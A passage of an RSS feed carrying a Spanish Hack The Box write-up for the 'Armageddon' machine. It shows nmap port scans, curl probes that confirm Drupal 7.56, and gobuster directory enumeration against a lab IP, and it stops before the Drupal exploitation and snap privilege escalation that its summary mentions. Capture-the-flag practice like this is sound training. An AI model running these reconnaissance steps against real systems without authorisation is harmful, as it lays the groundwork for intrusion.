<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>drupalgeddon2 on sckull</title>
    <link>https://sckull.github.io/tags/drupalgeddon2/</link>
    <description>Recent content in drupalgeddon2 on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>Â©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 24 Jul 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/drupalgeddon2/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Armageddon</title>
        <link>https://sckull.github.io/posts/armageddon/</link>
        <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 24 Jul 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/armageddon/</guid>
        <description>Armageddon una maquina de HackTheBox con SO Linux, encontramos una version de Drupal desactualizada por donde obtuvimos acceso.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/armageddon/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Armageddon una maquina de HackTheBox con SO Linux, encontramos una version de Drupal desactualizada por donde obtuvimos acceso. Tras obtener credenciales de una base de datos cambiamos a un siguiente usuario, y, con este ultimo escalamos privilegios creando un paquete de snap.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/323&#34;&gt;Armageddon&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.233&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/27897&#34;&gt;bertolis&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/27897&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[5, 4.6, 5.8, 4.2, 5.4],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;RECON&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Sun Mar 28 01:55:48 2021 as: nmap -Pn -p- --min-rate 10000 -oN allports 10.10.10.233&lt;/span&gt;
Warning: 10.10.10.233 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.233 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.233&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.097s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;41553&lt;/span&gt; filtered ports, &lt;span class=&#34;m&#34;&gt;23980&lt;/span&gt; closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Mar 28 01:57:23 2021 -- 1 IP address (1 host up) scanned in 95.32 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Sun Mar 28 01:58:26 2021 as: nmap -Pn -sV -sC -p 22,80 -oN serviceports 10.10.10.233&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.233 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.233&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.21s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: Drupal &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Welcome to  Armageddon &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sun Mar 28 01:58:44 2021 -- 1 IP address (1 host up) scanned in 17.45 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;drupal&#34;&gt;DRUPAL&lt;/h2&gt;
&lt;p&gt;Encontramos en el puerto 80 Drupal en su version 7 y basandonos en el archivo &lt;code&gt;CHANGELOG.txt&lt;/code&gt; e &lt;a href=&#34;https://stackoverflow.com/a/10728815&#34;&gt;/includes/bootstrap.inc&lt;/a&gt; podriamos confirmar que la version es &lt;code&gt;7.56&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
Date: Sun, &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 06:03:20 GMT
Server: Apache/2.4.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Sun, &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;1978&lt;/span&gt; 05:00:00 GMT
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
Content-Language: en
X-Frame-Options: SAMEORIGIN
X-Generator: Drupal &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Content-Length: &lt;span class=&#34;m&#34;&gt;7440&lt;/span&gt;
Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf-8
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;âââ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/armageddon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
ââ$ curl -s http://10.10.10.233/CHANGELOG.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; head
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;access bypass&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;. See SA-CORE-2017-003.

âââ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/armageddon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
ââ$ curl -s http://10.10.10.233/includes/bootstrap.inc&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;define(&amp;#39;VERSION&amp;#39;&amp;#34;&lt;/span&gt;
define&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;VERSION&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;7.56&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Gobustter mostrÃ³ direcciones que pertenecen a drupal.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;âââ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/armageddon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
ââ$ gobuster dir -u http://10.10.10.233/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; -q -x php,html,txt,xml,py,pl,sh,bak
/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cgi-bin/ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cgi-bin/.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/includes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/install.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
